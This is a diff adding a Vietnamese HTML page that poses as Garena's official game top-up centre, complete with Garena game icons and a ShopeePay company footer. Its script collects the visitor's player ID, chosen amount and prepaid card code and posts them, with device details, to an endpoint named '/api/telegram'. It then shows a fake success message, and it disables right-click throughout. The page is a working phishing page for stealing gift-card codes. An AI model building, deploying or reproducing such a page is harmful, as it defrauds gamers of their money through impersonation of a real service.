@@ -1,0 +1,879 @@
+﻿<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena - Trung tâm nạp thẻ chính thức</title>
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+            color: #1f2937;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        /* Header */
+        .header {
+            background: white;
+            border-bottom: 1px solid #e5e7eb;
+            padding: 12px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .logo {
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            display: block;
+        }
+        .page-title {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: #374151;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .support-link {
+            color: #e13b3b;
+            text-decoration: none;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .avatar svg {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+        }
+        /* Banner */
+        .banner-fullwidth {
+            background: #1e293b;
+            height: 300px;
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .banner-content {
+            height: 100%;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .banner-content img {
+            max-width: 95%;
+            max-height: 95%;
+            width: auto;
+            height: auto;
+            object-fit: contain;
+            border-radius: 16px;
+        }
+        /* Main */
+        .main-content {
+            padding: 20px 0 60px;
+        }
+        .section-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 24px;
+            color: #111827;
+        }
+        /* Game grid */
+        .game-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 20px;
+            margin-bottom: 48px;
+        }
+        .game-item {
+            background: transparent;
+            border-radius: 12px;
+            padding: 0;
+            text-align: center;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .game-item:hover {
+            transform: translateY(-4px);
+        }
+        .game-item.selected .game-name {
+            color: #e13b3b;
+            font-weight: 700;
+        }
+        .game-icon {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 12px;
+            border-radius: 24px;
+            overflow: hidden;
+            background: #f3f4f6;
+            position: relative;
+            transition: box-shadow 0.2s, border-color 0.2s;
+            border: 4px solid transparent;
+        }
+        .game-icon.selected {
+            border-color: #e13b3b;
+        }
+        .game-icon.selected::after {
+            content: '';
+            position: absolute;
+            top: -4px;
+            left: -4px;
+            width: 45px;
+            height: 45px;
+            background: #e13b3b;
+            clip-path: polygon(0 0, 0% 100%, 100% 0);
+            z-index: 2;
+        }
+        .game-icon.selected::before {
+            content: '\f00c';
+            font-family: 'Font Awesome 5 Free';
+            font-weight: 900;
+            position: absolute;
+            top: 1px;
+            left: 1px;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 14px;
+            z-index: 3;
+            pointer-events: none;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+        }
+        .game-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .game-name {
+            font-weight: 600;
+            font-size: 0.9rem;
+            transition: color 0.2s;
+            max-width: 100px;
+            margin: 0 auto;
+        }
+        /* Form nạp thẻ */
+        .card-form-section {
+            background: white;
+            border-radius: 24px;
+            padding: 32px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+        /* Step headers với badge */
+        .step-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        .step-badge {
+            width: 40px;
+            height: 40px;
+            background: #e13b3b;
+            clip-path: polygon(0 0, 100% 0, 100% 70%, 70% 100%, 0 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .step-number {
+            color: white;
+            font-weight: 700;
+            font-size: 1.3rem;
+            line-height: 1;
+        }
+        .step-header .step-title {
+            font-weight: 700;
+            font-size: 1.3rem;
+            color: #111827;
+        }
+        /* Account info (khung xám) */
+        .account-info {
+            background: #f9fafb;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .account-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        .account-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .account-detail {
+            flex: 1;
+        }
+        .account-id {
+            font-size: 1rem;
+            color: #374151;
+        }
+        /* Menh gia - với tabs (chỉ một tab) */
+        .menhgia-section .tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 24px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+        .tab {
+            padding: 12px 24px;
+            font-weight: 600;
+            color: #6b7280;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+        .tab.active {
+            color: #e13b3b;
+            border-bottom-color: #e13b3b;
+        }
+        .tab:not(.active) {
+            display: none;
+        }
+        .tab-content {
+            display: block;
+        }
+        .info-link {
+            margin-bottom: 16px;
+        }
+        .info-link a {
+            color: #e13b3b;
+            text-decoration: none;
+        }
+        /* Card grid mới với icon */
+        .card-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .card-item {
+            background: #f9fafb;
+            border: 2px solid transparent;
+            border-radius: 12px;
+            padding: 12px;
+            cursor: pointer;
+            transition: border-color 0.2s, background 0.2s;
+        }
+        .card-item:hover {
+            background: #f3f4f6;
+        }
+        .card-item.selected {
+            border-color: #e13b3b;
+            background: #fef2f2;
+        }
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+        .card-icon {
+            width: 30px;
+            height: 30px;
+            object-fit: contain;
+            border-radius: 6px;
+        }
+        .card-fv {
+            font-weight: 700;
+            font-size: 1.1rem;
+            color: #111827;
+        }
+        .card-price {
+            font-size: 0.9rem;
+            color: #6b7280;
+            margin-left: 38px;
+        }
+        .input-field {
+            margin: 24px 0;
+        }
+        .input-field label {
+            display: block;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #374151;
+        }
+        /* Hàng chứa ô mã thẻ và captcha */
+        .card-code-row {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+        .card-code-input {
+            width: 280px;
+            padding: 12px 16px;
+            border: 1px solid #d1d5db;
+            border-radius: 12px;
+            font-size: 1rem;
+        }
+        .card-code-input:focus {
+            outline: none;
+            border-color: #e13b3b;
+        }
+        .captcha-container {
+            flex-shrink: 0;
+        }
+        .btn-confirm {
+            background: #9ca3af;
+            color: white;
+            border: none;
+            padding: 14px 36px;
+            border-radius: 999px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: not-allowed;
+            transition: background 0.2s;
+            margin-top: 16px;
+            pointer-events: none;
+        }
+        .btn-confirm.active {
+            background: #e13b3b;
+            cursor: pointer;
+            pointer-events: auto;
+        }
+        .btn-confirm.active:hover {
+            background: #b12b2b;
+        }
+        /* Bước 1 styles */
+        .step-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #374151;
+        }
+        .login-group {
+            display: flex;
+            width: 100%;
+            max-width: 500px;
+            border: 1px solid #d1d5db;
+            border-radius: 12px;
+            overflow: hidden;
+            background: white;
+            margin-bottom: 24px;
+        }
+        .uid-input {
+            flex: 1;
+            border: none;
+            padding: 12px 16px;
+            font-size: 1rem;
+            outline: none;
+        }
+        .btn-login {
+            background: #e13b3b;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background 0.2s;
+            white-space: nowrap;
+        }
+        .btn-login:hover {
+            background: #b12b2b;
+        }
+        .error-message {
+            color: #dc2626;
+            font-size: 0.875rem;
+            margin-top: 4px;
+            display: none;
+        }
+        .uid-input-group {
+            margin-bottom: 0;
+        }
+        .social-login p {
+            color: #6b7280;
+            margin-bottom: 12px;
+        }
+        .social-icons {
+            display: flex;
+            gap: 16px;
+        }
+        .social-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: #f3f4f6;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #374151;
+            transition: background 0.2s;
+        }
+        .social-icon:hover {
+            background: #e5e7eb;
+        }
+        /* Footer */
+        .footer {
+            background: white;
+            border-top: 1px solid #e5e7eb;
+            padding: 40px 0;
+            margin-top: 40px;
+        }
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 30px;
+        }
+        .footer-info p {
+            color: #4b5563;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+        }
+        .footer-links {
+            display: flex;
+            gap: 24px;
+            flex-wrap: wrap;
+        }
+        .footer-links a {
+            color: #6b7280;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        .footer-links a:hover {
+            color: #e13b3b;
+        }
+    </style>
+    <!-- reCAPTCHA API -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+    <div class="app">
+        <header class="header">
+            <div class="container header-container">
+                <div class="header-left">
+                    <div class="logo">
+                        <img src="https://logospng.org/download/garena/logo-escudo-garena-512.png" alt="Garena" onerror="this.style.display='none'; this.parentElement.style.background='#e13b3b';">
+                    </div>
+                    <h1 class="page-title">Trung tâm nạp thẻ chính thức</h1>
+                </div>
+                <div class="header-right">
+                    <a href="https://hotro.garena.vn/" class="support-link" target="_blank">
+                        <i class="fas fa-headset"></i> Hỗ trợ
+                    </a>
+                    <div class="avatar">
+                        <svg width="40" height="40" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="40" cy="40" r="40" fill="#C8C8C8"></circle>
+                            <circle cx="40" cy="25.6694" r="14" fill="white"></circle>
+                            <path d="M18.6624 60.6252C16.2799 58.0468 17.02 54.0297 20.0672 52.2863C25.9526 48.9192 32.7514 46.9976 39.9935 46.9976C47.2356 46.9976 54.0345 48.9192 59.9198 52.2863C62.967 54.0297 63.7072 58.0468 61.3246 60.6252C55.9949 66.3929 48.41 69.9976 39.9935 69.9976C31.5771 69.9976 23.9921 66.3929 18.6624 60.6252Z" fill="white"></path>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Banner -->
+        <div class="banner-fullwidth">
+            <div class="banner-content">
+                <img src="https://i.ibb.co/8LbP62GN/noname.png" alt="Banner">
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <div class="container">
+                <!-- Grid game -->
+                <div class="game-section">
+                    <h2 class="section-title">Lựa chọn trò chơi</h2>
+                    <div class="game-grid" id="gameGrid"></div>
+                </div>
+
+                <!-- Form nạp thẻ -->
+                <div class="card-form-section">
+                    <div class="section-title">Nạp thẻ game</div>
+                    <!-- Bước 1 -->
+                    <div id="step1-container">
+                        <div class="step-title">ID người chơi</div>
+                        <div class="login-group">
+                            <input type="text" id="uid" class="uid-input" placeholder="Hãy nhập UID của bạn" maxlength="25">
+                            <button class="btn-login" id="loginBtn">Đăng nhập</button>
+                        </div>
+                        <div class="error-message" id="uid-error">ID người chơi không hợp lệ</div>
+                        <div class="social-login"></div>
+                    </div>
+                    <!-- Bước 2 -->
+                    <div id="step2-container" style="display: none;">
+                        <div class="step-header">
+                            <div class="step-badge">
+                                <span class="step-number">1</span>
+                            </div>
+                            <span class="step-title">Tài khoản</span>
+                        </div>
+                        <div class="account-info">
+                            <div class="account-avatar">
+                                <img id="account-avatar-img" src="https://ui-avatars.com/api/?name=Gamer&size=50&background=e13b3b&color=fff" alt="avatar">
+                            </div>
+                            <div class="account-detail">
+                                <p class="account-id"><strong>ID người chơi: <span id="account-id">1055844113823490048</span></strong></p>
+                            </div>
+                        </div>
+
+                        <div class="step-header">
+                            <div class="step-badge">
+                                <span class="step-number">2</span>
+                            </div>
+                            <span class="step-title">Mệnh giá nạp</span>
+                        </div>
+                        <div class="menhgia-section">
+                            <div class="tabs">
+                                <div class="tab active">Thẻ Garena</div>
+                            </div>
+                            <div class="tab-content active">
+                                <div class="info-link">
+                                    <a href="#"><i class="fas fa-map-marker-alt"></i> Tìm điểm bán thẻ Garena tại đây</a>
+                                </div>
+                                <div class="card-grid" id="dynamic-card-grid"></div>
+                                <div class="input-field">
+                                    <label for="cardCode">Mã nạp thẻ Garena</label>
+                                    <div class="card-code-row">
+                                        <input type="text" id="cardCode" class="card-code-input" placeholder="Nhập mã thẻ" maxlength="25">
+                                        <div class="captcha-container">
+                                            <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <button class="btn-confirm" id="confirmBtn" disabled>Xác nhận</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="container">
+                <div class="footer-content">
+                    <div class="footer-info">
+                        <p>CÔNG TY CỔ PHẦN SHOPEEPAY</p>
+                        <p>Giấy CNĐKKD số 0103959912, cấp lần đầu ngày 09/06/2009</p>
+                        <p>Địa chỉ: Tầng 29, Tòa nhà Trung tâm Lotte Hà Nội...</p>
+                    </div>
+                    <div class="footer-links">
+                        <a href="#">Câu hỏi thường gặp</a>
+                        <a href="#">Điều khoản sử dụng</a>
+                        <a href="#">Chính sách bảo mật</a>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script>
+        // Mảng game
+        const games = [
+            { name: 'FC Mobile VN', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/155/icon.png' },
+            { name: 'Liên Quân Mobile', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/054/icon.png' },
+            { name: 'Free Fire', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png' },
+            { name: 'Delta Force', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/151/icon.png' },
+        ];
+
+        // Danh sách thẻ theo game
+        const gameCards = {
+            'FC Mobile VN': [
+                { fv: '80 FV', price: '20.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/155/point.png' },
+                { fv: '200 FV', price: '50.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/155/point.png' },
+                { fv: '400 FV', price: '100.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/155/point.png' },
+                { fv: '800 FV', price: '200.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/155/point.png' },
+                { fv: '2000 FV', price: '500.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/155/point.png' },
+            ],
+            'Liên Quân Mobile': [
+                { fv: '80 Quân huy', price: '20.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/054/point.png' },
+                { fv: '200 Quân huy', price: '50.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/054/point.png' },
+                { fv: '400 Quân huy', price: '100.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/054/point.png' },
+                { fv: '800 Quân huy', price: '200.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/054/point.png' },
+                { fv: '2000 Quân huy', price: '500.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/054/point.png' }
+            ],
+            'Free Fire': [
+                { fv: '204 Kim Cương', price: '20.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png' },
+                { fv: '510 Kim Cương', price: '50.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png' },
+                { fv: '1020 Kim Cương', price: '100.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png' },
+                { fv: '2040 Kim Cương', price: '200.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png' },
+                { fv: '5100 Kim Cương', price: '500.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png' }
+            ],
+            'Delta Force': [
+                { fv: '160 Delta Coin', price: '20.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/151/point.png' },
+                { fv: '400 Delta Coin', price: '50.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/151/point.png' },
+                { fv: '800 Delta Coin', price: '100.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/151/point.png' },
+                { fv: '1600 Delta Coin', price: '200.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/151/point.png' },
+                { fv: '4000 Delta Coin', price: '500.000', icon: 'https://cdn-gop.garenanow.com/gop/app/0000/100/151/point.png' }
+            ]
+        };
+
+        // Avatar map
+        const gameAvatars = {
+            'FC Mobile VN': 'https://cdn-gop.garenanow.com/gop/app/0000/100/155/icon.png',
+            'Liên Quân Mobile': 'https://cdn-gop.garenanow.com/gop/app/0000/100/054/icon.png',
+            'Free Fire': 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png',
+            'Delta Force': 'https://cdn-gop.garenanow.com/gop/app/0000/100/151/icon.png'
+        };
+
+        let selectedGame = null;
+
+        // Render game grid
+        const gameGrid = document.getElementById('gameGrid');
+        games.forEach(game => {
+            const item = document.createElement('div');
+            item.className = 'game-item';
+            item.dataset.game = game.name;
+            item.innerHTML = `
+                <div class="game-icon">
+                    <img src="${game.icon}" alt="${game.name}" 
+                         onerror="this.onerror=null; this.src='https://placehold.co/100x100/6b7280/white?text=Game';">
+                </div>
+                <div class="game-name">${game.name}</div>
+            `;
+            gameGrid.appendChild(item);
+        });
+
+        // Hàm render card
+        function renderCardsForGame(gameName) {
+            const container = document.getElementById('dynamic-card-grid');
+            if (!container) return;
+            const cards = gameCards[gameName] || [];
+            let html = '';
+            cards.forEach(card => {
+                html += `
+                    <div class="card-item" data-fv="${card.fv}" data-price="${card.price.replace(/\./g,'')}">
+                        <div class="card-header">
+                            <img src="${card.icon}" alt="icon" class="card-icon" onerror="this.src='https://placehold.co/30x30/6b7280/white?text=Icon';">
+                            <span class="card-fv">${card.fv}</span>
+                        </div>
+                        <div class="card-price">${card.price} <span>đ</span></div>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+            $('.card-item').off('click').on('click', function() {
+                $('.card-item').removeClass('selected');
+                $(this).addClass('selected');
+            });
+        }
+
+        // Hàm phát hiện thiết bị
+        function detectDevice() {
+            const ua = navigator.userAgent;
+            const device = {
+                type: 'desktop',
+                os: 'unknown',
+                browser: 'unknown',
+                ua: ua
+            };
+            if (/Windows/.test(ua)) device.os = 'Windows';
+            else if (/Mac OS/.test(ua)) device.os = 'macOS';
+            else if (/iPhone|iPad|iPod/.test(ua)) {
+                device.os = 'iOS';
+                device.type = /iPad/.test(ua) ? 'tablet' : 'mobile';
+            }
+            else if (/Android/.test(ua)) {
+                device.os = 'Android';
+                device.type = /Mobile/.test(ua) ? 'mobile' : 'tablet';
+            }
+            else if (/Linux/.test(ua)) device.os = 'Linux';
+
+            if (/Edg/.test(ua)) device.browser = 'Edge';
+            else if (/Chrome/.test(ua)) device.browser = 'Chrome';
+            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) device.browser = 'Safari';
+            else if (/Firefox/.test(ua)) device.browser = 'Firefox';
+            else if (/MSIE|Trident/.test(ua)) device.browser = 'Internet Explorer';
+
+            return device;
+        }
+
+        $(document).ready(function() {
+            // Chặn chuột phải
+            $(document).on('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // Xử lý chọn game
+            $('.game-grid').on('click', '.game-item', function() {
+                if ($('#step2-container').is(':visible')) {
+                    $('#step2-container').hide();
+                    $('#step1-container').show();
+                    $('#uid').val('');
+                    $('#uid-error').hide();
+                    $('#uid').removeClass('error');
+                    $('.card-item').removeClass('selected');
+                }
+                $('.game-item').removeClass('selected');
+                $('.game-icon').removeClass('selected');
+                $(this).addClass('selected');
+                $(this).find('.game-icon').addClass('selected');
+                selectedGame = $(this).data('game');
+            });
+
+            // Xử lý đăng nhập
+            function handleLogin() {
+                $('#uid-error').hide();
+                $('#uid').removeClass('error');
+
+                if (!selectedGame) {
+                    Swal.fire('Thông báo', 'Vui lòng chọn trò chơi', 'warning');
+                    return;
+                }
+
+                const uid = $('#uid').val().trim();
+                if (!uid) {
+                    Swal.fire('Thông báo', 'Vui lòng nhập UID', 'warning');
+                    $('#uid').addClass('error');
+                    return;
+                }
+
+                if (!/^\d+$/.test(uid) || uid.length < 10 || uid.length > 25) {
+                    $('#uid').addClass('error');
+                    $('#uid-error').show();
+                    return;
+                }
+
+                $('#account-id').text(uid);
+                $('#account-avatar-img').attr('src', gameAvatars[selectedGame] || 'https://ui-avatars.com/api/?name=Gamer&size=50&background=e13b3b&color=fff');
+                renderCardsForGame(selectedGame);
+                $('#step1-container').hide();
+                $('#step2-container').show();
+            }
+
+            $('#loginBtn').on('click', handleLogin);
+            $('#uid').on('keypress', function(e) {
+                if (e.which === 13) {
+                    e.preventDefault();
+                    handleLogin();
+                }
+            });
+
+            $('#uid').on('input', function() {
+                $('#uid-error').hide();
+                $('#uid').removeClass('error');
+            });
+
+            // Xử lý nhập mã thẻ
+            $('#cardCode').on('input', function() {
+                let value = $(this).val().replace(/\D/g, '');
+                $(this).val(value);
+                const isValid = value.length >= 16 && value.length <= 25;
+                if (isValid) {
+                    $('#confirmBtn').prop('disabled', false).addClass('active');
+                } else {
+                    $('#confirmBtn').prop('disabled', true).removeClass('active');
+                }
+            });
+
+            // Xử lý xác nhận
+            $('#confirmBtn').on('click', function() {
+                if ($(this).prop('disabled')) return;
+
+                const selected = $('.card-item.selected');
+                if (selected.length === 0) {
+                    Swal.fire('Thông báo', 'Chọn mệnh giá', 'warning');
+                    return;
+                }
+
+                const code = $('#cardCode').val().trim();
+                if (!code) {
+                    Swal.fire('Thông báo', 'Nhập mã thẻ', 'warning');
+                    return;
+                }
+
+                const captchaResponse = grecaptcha.getResponse();
+                if (!captchaResponse) {
+                    Swal.fire('Thông báo', 'Vui lòng xác minh bạn không phải robot', 'warning');
+                    return;
+                }
+
+                const uid = $('#account-id').text();
+                const menhgia = selected.data('price') + ' đ';
+                const game = selectedGame;
+                const device = detectDevice();
+
+                fetch('/api/telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        uid: uid,
+                        menhgia: menhgia,
+                        mathe: code,
+                        game: game,
+                        device: device,
+                        captchaToken: captchaResponse
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        Swal.fire({
+                            title: 'Thành công',
+                            text: 'Đã gửi yêu cầu nạp thẻ',
+                            icon: 'success',
+                            confirmButtonColor: '#e13b3b'
+                        }).then(() => {
+                            $('#cardCode').val('');
+                            $('.card-item').removeClass('selected');
+                            $('#confirmBtn').prop('disabled', true).removeClass('active');
+                            grecaptcha.reset();
+                        });
+                    } else {
+                        Swal.fire('Lỗi', data.error || 'Có lỗi xảy ra', 'error');
+                    }
+                })
+                .catch(error => {
+                    Swal.fire('Lỗi', 'Không thể kết nối đến server', 'error');
+                    console.error(error);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
